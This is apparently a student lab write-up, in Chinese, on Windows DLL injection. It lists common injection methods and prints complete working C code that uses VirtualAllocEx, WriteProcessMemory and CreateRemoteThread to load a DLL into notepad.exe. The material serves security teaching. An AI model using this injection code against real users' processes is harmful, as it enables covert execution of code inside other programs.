# DLL注入

## 实验背景

- 所谓的dll注入即是让程序A强行加载程序B给定的a.dll，并执行程序B给定的a.dll里面的代码。注意，程序B所给定的a.dll原先并不会被程序A主动加载，但是当程序B通过某种手段让程序A“加载”a.dll后，程序A将会执行a.dll里的代码，此时，a.dll就进入了程序A的地址空间，而a.dll模块的程序逻辑由程序B的开发者设计，因此程序B的开发者可以对程序A为所欲为。
- 一般dll注入方法
  - 修改注册表来注入dll
  - 使用CreateRemoteThread函数对运行中的进程注入dll
  - 使用SetWindowsHookEx函数对应用程序挂钩(HOOK)迫使程序加载dll
  - 替换应用程序一定会使用的dll
  - 用CreateProcess对子进程注入dll
  - 修改被注入进程的exe的导入地址表
- 本实验将使用CreateRemoteThread函数进行dll注入的示例代码来完成实验
  - 使用VirtualAllocEx在目标进程的地址空间中创建一块我们DLL所在路径长度的内存空间。
  - 使用WriteProcessMemory将DLL路径写入分配的内存。
  - 一旦DLL路径写入内存中，再使用CreateRemoteThread，它调用LoadLibrary函数将DLL注入目标进程中。

## 实验过程

- CreateRemoteThread[示例代码](https://github.com/fdiskyou/injectAllTheThings/blob/master/injectAllTheThings)
  ```
    #include <stdio.h>
    #include <Windows.h>
    #include <tlhelp32.h>
    #include "fheaders.h"

    DWORD demoCreateRemoteThreadW(PCWSTR pszLibFile, DWORD dwProcessId)
    {
        // Calculate the number of bytes needed for the DLL's pathname
        DWORD dwSize = (lstrlenW(pszLibFile) + 1) * sizeof(wchar_t);

        // Get process handle passing in the process ID
        HANDLE hProcess = OpenProcess(
            PROCESS_QUERY_INFORMATION |
            PROCESS_CREATE_THREAD |
            PROCESS_VM_OPERATION |
            PROCESS_VM_WRITE,
            FALSE, dwProcessId);
        if (hProcess == NULL)
        {
            printf(TEXT("[-] Error: Could not open process for PID (%d).\n"), dwProcessId);
            return(1);
        }

        // Allocate space in the remote process for the pathname
        LPVOID pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (pszLibFileRemote == NULL)
        {
            printf(TEXT("[-] Error: Could not allocate memory inside PID (%d).\n"), dwProcessId);
            return(1);
        }

        // Copy the DLL's pathname to the remote process address space
        DWORD n = WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID)pszLibFile, dwSize, NULL);
        if (n == 0)
        {
            printf(TEXT("[-] Error: Could not write any bytes into the PID [%d] address space.\n"), dwProcessId);
            return(1);
        }

        // Get the real address of LoadLibraryW in Kernel32.dll
        PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
        if (pfnThreadRtn == NULL)
        {
            printf(TEXT("[-] Error: Could not find LoadLibraryA function inside kernel32.dll library.\n"));
            return(1);
        }

        // Create a remote thread that calls LoadLibraryW(DLLPathname)
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, pszLibFileRemote, 0, NULL);
        if (hThread == NULL)
        {
            printf(TEXT("[-] Error: Could not create the Remote Thread.\n"));
            return(1);
        }
        else
            printf(TEXT("[+] Success: DLL injected via CreateRemoteThread().\n"));

        // Wait for the remote thread to terminate
        WaitForSingleObject(hThread, INFINITE);

        // Free the remote memory that contained the DLL's pathname and close Handles
        if (pszLibFileRemote != NULL)
            VirtualFreeEx(hProcess, pszLibFileRemote, 0, MEM_RELEASE);

        if (hThread != NULL)
            CloseHandle(hThread);

        if (hProcess != NULL)
            CloseHandle(hProcess);

        return(0);
    }
  ```

- 主程序

  ```
    #include <Windows.h>
    #include <stdio.h>
    #include <versionhelpers.h>
    #include "fheaders.h"
    #include "auxiliary.h"
    #pragma warning(disable:4996)

    DWORD wmain(int argc, wchar_t* argv[])
    {
        DWORD dwProcessId = 0;

        dwProcessId = findPidByName("notepad.exe");
        demoCreateRemoteThreadW(L"D:\\大三\\SDL\\课堂实验\\DLL注入\\injectAllTheThings\\Debug\\baselib.dll", dwProcessId);
        return(0);
    }

  ```
  
  - findPidByName函数：遍历当前进程，找到相同名称进程的pid
  - demoCreateRemoteThreadW函数：完成整个注入过程的函数，需要dll文件的绝对路径和进程pid
- 所使用到的dll
  - DLL被加载到进程后会自动运行DllMain()函数，用户可以把想执行的代码放到DllMain()函数，每当加载DLL时，添加的代码就会自然得到执行。所以需要增加DLLMain()函数
  - 代码完成后，将项目设置-配置属性-常规-项目默认值设置为动态库(.dll)，然后重新生成项目解决方案，在Debug文件夹生成我们所需要的dll文件
- 运行主程序，完成注入
  ![ ](image\注入成功.JPG)